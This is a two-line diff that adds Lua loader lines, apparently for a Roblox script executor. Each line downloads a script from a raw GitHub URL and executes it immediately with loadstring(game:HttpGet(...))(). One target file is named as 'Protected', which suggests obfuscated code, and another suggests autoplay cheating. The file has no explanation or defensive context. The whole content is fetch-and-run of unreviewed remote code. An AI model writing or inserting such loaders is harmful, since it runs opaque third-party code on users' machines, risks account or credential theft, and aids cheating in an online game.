@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MADNESSTEST/Pqoeirnfjw/main/AP3-5.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Sgesa/RandomCatsAutoplay/main/Protected_1274635038188005.lua.txt", true))()
